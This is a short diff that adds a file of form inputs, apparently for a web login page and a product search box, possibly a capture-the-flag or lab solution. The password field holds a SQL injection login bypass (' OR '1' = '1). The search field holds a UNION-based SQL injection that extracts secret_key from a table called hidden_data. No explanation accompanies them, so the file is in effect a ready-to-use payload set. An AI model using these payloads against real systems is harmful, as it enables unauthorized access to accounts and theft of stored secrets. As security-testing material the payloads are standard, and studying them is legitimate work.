@@ -1,0 +1,8 @@
+Username:
+admin
+
+Password:
+' OR '1' = '1
+
+Search Products:
+-1' union select '', '', '', secret_key from hidden_data; --
